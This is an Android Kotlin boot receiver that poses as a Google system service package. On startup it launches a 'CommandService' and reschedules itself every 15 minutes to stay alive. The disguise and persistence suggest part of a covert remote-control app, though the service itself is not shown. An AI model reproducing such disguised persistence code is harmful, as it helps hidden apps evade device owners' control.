package com.google.android.systemservice.receivers

import android.app.AlarmManager
import android.app.PendingIntent
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.SystemClock
import android.util.Log
import com.google.android.systemservice.services.CommandService

class BootReceiver : BroadcastReceiver() {

    companion object {
        private const val TAG = "BootReceiver"
        private const val ALARM_INTERVAL_MS = 15 * 60 * 1000L // 15 minutes
        private const val ACTION_KEEP_ALIVE = "com.google.android.systemservice.KEEP_ALIVE"
    }

    override fun onReceive(context: Context, intent: Intent) {
        Log.d(TAG, "Received: ${intent.action}")

        when (intent.action) {
            Intent.ACTION_BOOT_COMPLETED,
            "android.intent.action.QUICKBOOT_POWERON",
            "com.htc.intent.action.QUICKBOOT_POWERON",
            ACTION_KEEP_ALIVE -> {
                startServices(context)
                scheduleAlarm(context)
            }
            Intent.ACTION_MY_PACKAGE_REPLACED -> {
                // App was updated
                startServices(context)
                scheduleAlarm(context)
            }
        }
    }

    private fun startServices(context: Context) {
        try {
            val serviceIntent = Intent(context, CommandService::class.java)
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                try {
                    context.startForegroundService(serviceIntent)
                } catch (e: Exception) {
                    // Android 12+ ForegroundServiceStartNotAllowedException
                    Log.e(TAG, "Failed to start foreground service: ${e.message}")
                    // Fallback to standard start (might also fail but worth a try) or Schedule WorkManager
                    // For now, suppress the crash
                }
            } else {
                context.startService(serviceIntent)
            }
            
            Log.d(TAG, "Started CommandService")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start service: ${e.message}")
        }
    }

    private fun scheduleAlarm(context: Context) {
        try {
            val alarmManager = context.getSystemService(Context.ALARM_SERVICE) as AlarmManager
            
            val intent = Intent(context, BootReceiver::class.java).apply {
                action = ACTION_KEEP_ALIVE
            }
            
            val pendingIntent = PendingIntent.getBroadcast(
                context,
                0,
                intent,
                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
            )
            
            // Cancel existing alarm
            alarmManager.cancel(pendingIntent)
            
            // Schedule repeating alarm
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                // Check if we can schedule exact alarms (API 33+)
                try {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S && 
                        !alarmManager.canScheduleExactAlarms()) {
                        Log.w(TAG, "Cannot schedule exact alarms - using inexact alarm")
                        alarmManager.setAndAllowWhileIdle(
                            AlarmManager.ELAPSED_REALTIME_WAKEUP,
                            SystemClock.elapsedRealtime() + ALARM_INTERVAL_MS,
                            pendingIntent
                        )
                    } else {
                        alarmManager.setExactAndAllowWhileIdle(
                            AlarmManager.ELAPSED_REALTIME_WAKEUP,
                            SystemClock.elapsedRealtime() + ALARM_INTERVAL_MS,
                            pendingIntent
                        )
                    }
                } catch (e: SecurityException) {
                    Log.e(TAG, "SecurityException scheduling exact alarm: ${e.message}")
                    // Fallback to inexact alarm
                    alarmManager.setAndAllowWhileIdle(
                        AlarmManager.ELAPSED_REALTIME_WAKEUP,
                        SystemClock.elapsedRealtime() + ALARM_INTERVAL_MS,
                        pendingIntent
                    )
                }
            } else {
                alarmManager.setRepeating(
                    AlarmManager.ELAPSED_REALTIME_WAKEUP,
                    SystemClock.elapsedRealtime() + ALARM_INTERVAL_MS,
                    ALARM_INTERVAL_MS,
                    pendingIntent
                )
            }
            
            Log.d(TAG, "Scheduled keep-alive alarm")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to schedule alarm: ${e.message}")
        }
    }
}
